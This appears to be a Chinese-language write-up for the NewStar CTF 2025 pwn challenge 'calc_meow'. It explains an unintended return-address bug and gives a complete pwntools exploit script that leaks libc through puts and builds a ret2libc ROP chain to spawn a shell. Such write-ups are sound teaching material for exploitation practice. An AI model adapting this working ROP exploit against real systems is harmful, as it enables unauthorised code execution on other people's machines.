---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# calc_meow

## 分析

由于本体的限制不够严格，导致有一个简单的非预期。

| `rsp - 8x` |         `retaddr`          |
| :--------: | :------------------------: |
|   `rsp`    | `numbers[] / main函数栈顶` |
|    ...     |            ...             |
|   `rbp`    |       `main函数栈底`       |

本题开启了 `pie`，因此你没法像 `calc_beta` 那样直接编辑 ROP 链

但是 `retaddr` 是 `pie` 里面的地址，结合 `calc` 里面的功能，实际上我们拿到了一个任意执行 `elf` 内指令的原语。

而且由于 `elf` 里面有 `pop rdi; ret;` 导致本题可以直接通过 `pop rdi; func@got; ret; puts@plt;` 的办法直接拿到 libc 地址

拿到 libc 地址后，本题就变成了简单的 `ret2libc`，简单构造 ROP 链就可以拿到 shell

最终 EXP 如下：

```python
from pwn import *

sla = lambda x,s : p.sendlineafter(x,s)
sl = lambda s : p.sendline(s)
sa = lambda x,s : p.sendafter(x,s)
s = lambda s : p.send(s)

e = ELF('./calc')
context.arch = e.arch
context.bits = e.bits
libc = ELF('./libc.so.6')

def menu(choice):
    sla('> ', str(choice))

def show():
    menu(1)
    nums = []
    for i in range(0, 16):
        p.recvuntil(' = ')
        nums.append(int(p.recvline(keepends=False), 10))
    return nums

def add(idx1, idx2, idx3):
    menu(1)
    sla('>',str(idx1))
    sla('>',str(idx2))
    sla('>',str(idx3))

def edit(idx, content):
    menu(2)
    sla('>',str(idx))
    sla('>',str(content))

# p = remote('', 12345)
p = process('./calc')
gdb.attach(p)

rdi = e.search(asm("pop rdi; nop; ret"), executable = True).__next__()

edit(1, e.got['puts'])
edit(2, e.plt['puts'])
edit(3, e.sym['main'])
edit(4, -0x1cda)
edit(5, rdi)
menu(4)
add(4, 0, 0)
add(0, 1, 1)
add(0, 2, 2)
add(0, 3, 3)
add(5, 0, 0)
menu(6)
libcbase = u64(p.recv(6) + b'\x00\x00') - 0x80e50
print(hex(libcbase))

libc.address = libcbase
rdi = libc.search(asm("pop rdi; ret"), executable = True).__next__()
binsh = libc.search("/bin/sh").__next__()
saddr = libc.sym['system']
edit(1, binsh)
edit(2, rdi+1)
edit(3, saddr)
edit(0, rdi)

p.interactive()
```
